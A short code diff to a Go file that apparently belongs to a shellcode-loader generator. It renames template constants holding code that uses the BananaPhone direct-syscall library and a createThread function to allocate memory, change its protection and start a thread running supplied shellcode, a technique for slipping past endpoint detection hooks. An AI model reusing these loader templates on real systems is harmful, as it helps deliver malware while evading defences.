@@ -1,17 +1,14 @@
 package local
 
-const bananaPhoneImports = `
+const BananaPhoneImports = `
 	"syscall"
 	"unsafe"
 
-	
-
 	bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
 	
-
 `
 
-const bananaPhoneExtra = `
+const BananaPhoneExtra = `
 
 func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid, NtProtectVirtualMemorySysid, NtCreateThreadExSysid uint16) {
 
@@ -74,7 +71,8 @@ func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid
 	}
 }
 `
-const bananaPhone = `
+const BananaPhone = `
+
 	bp, e := bananaphone.NewBananaPhone(bananaphone.AutoBananaPhoneMode)
 	if e != nil {
 		panic(e)
@@ -94,4 +92,9 @@ const bananaPhone = `
 	}
 
 	createThread(shellcode, uintptr(0xffffffffffffffff), alloc, protect, createthread)
+		
+
+`
+const BananaPhoneDlls = `
+
 `
